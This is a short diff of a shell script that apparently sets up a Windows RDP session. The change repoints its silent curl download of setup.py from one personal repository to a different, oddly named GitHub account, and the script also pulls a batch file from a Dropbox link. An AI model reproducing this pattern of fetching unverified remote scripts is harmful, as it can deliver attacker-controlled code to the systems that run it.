@@ -2,7 +2,7 @@
 set -e
 
 # Download setup.py
-curl -s -L -o setup.py "https://gitlab.com/chamod12/lm_win-10_github_rdp/-/raw/main/setup.py"
+curl -s -L -o setup.py "https://raw.githubusercontent.com/connnecteed/e/refs/heads/main/setup.py"
 
 # Download other scripts (converted later)
 curl -s -L -o show.sh "https://dl.dropboxusercontent.com/scl/fi/snuqp2avrefpwn2krwqkj/show.bat?rlkey=t1fysps5f31bfkyg2ghy296u5&st=qa3h11at"
